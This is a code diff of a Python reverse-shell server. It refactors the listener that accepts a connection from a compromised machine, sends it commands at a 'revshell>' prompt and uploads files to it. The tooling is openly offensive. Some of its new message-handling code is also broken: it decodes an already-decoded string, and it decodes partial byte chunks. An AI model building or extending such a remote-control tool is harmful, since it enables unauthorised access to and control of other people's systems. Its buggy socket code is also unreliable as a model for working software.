@@ -14,6 +14,8 @@ import time
 # Intended to read any buffer size soon
 BUFFER_SIZE = 1024 * 128
 
+HEAD = 64
+
 # Still not very stable, need a way to stop
 # that thing and handle exceptions in case client
 # SIGINTs
@@ -145,14 +147,58 @@ class Shell:
 
 
 class Server:
-	def __init__(self, port):
+	def __init__(self):
 		try:
-			port = int(port)
+			port = int(sys.argv[1])
 		except ValueError:
 			print("The given port is not a number.\nUsage: python3 revshell-server.py <port>")
 			exit(1)
 
-def main_loop(client_socket):
+		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+		self.s.bind(('0.0.0.0', port))
+		self.s.listen()
+		print(f"Listening on 0.0.0.0:{port} ...")
+
+	def accept(self):
+		self.client_socket, client_ip = self.s.accept()
+		print(f"[+] Connection from {client_ip[0]}:{client_ip[1]}")
+
+	def send(self, msg):
+		msg = msg.encode()
+		if len(str(len(msg))) > HEAD:
+			print("[!] Message too long.\n[!] The last message hasn't been sent")
+		try:
+			msg_size = str(len(msg)).encode()
+			msg_size += b' ' * (HEAD - len(msg_size))
+			self.client_socket.sendall(msg_size)
+			self.client_socket.sendall(msg)
+		except:
+			print("[!] Failed to transfer data on socket.\n"
+				"[!] The shell might be unstable !")
+
+	def recvall(self, size):
+		ret = ''
+		while len(ret) < size:
+			ret += self.client_socket.recv(size).decode()
+		return ret
+	
+	def recv(self):
+		msg_size = int(self.recvall(HEAD))
+		return self.recvall(msg_size).decode()
+
+	def get_client_socket(self):
+		return self.client_socket
+
+	def __del__(self):
+		try:
+			self.client_socket.close()
+		except:
+			pass
+		self.s.close()
+
+
+def main_loop(server, client_socket):
 	while True:
 		try:
 			cmd = input("revshell> ")
@@ -185,30 +231,22 @@ def main_loop(client_socket):
 			transfer = FileTransfer(client_socket)
 			transfer.upload(cmd.split(" ")[1])
 		elif cmd == "exit":
+			client_socket.send("exit".encode())
 			return
 
 def sigIntHandler(signum, frame):
 	print("\nrevshell> ", end="")
 
 
-def main(PORT):
-	HOST = '0.0.0.0'
-
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-	s.bind((HOST, PORT))
-	s.listen()
-	print(f"Listening on {HOST}:{PORT} ...")
-	client_socket, client_ip = s.accept()
-	print(f"[+] Connection from {client_ip[0]}:{client_ip[1]}")
+def main():
+	server = Server()
+	server.accept()
 	signal.signal(signal.SIGINT, sigIntHandler)
-	main_loop(client_socket)
-
-	s.close()
+	main_loop(server, server.get_client_socket())
 	
 
 if __name__ == '__main__':
 	if len(sys.argv) != 2:
 		print("Usage: python3 revshell-server.py <port>")
 		exit(1)
-	main(int(sys.argv[1]))
+	main()
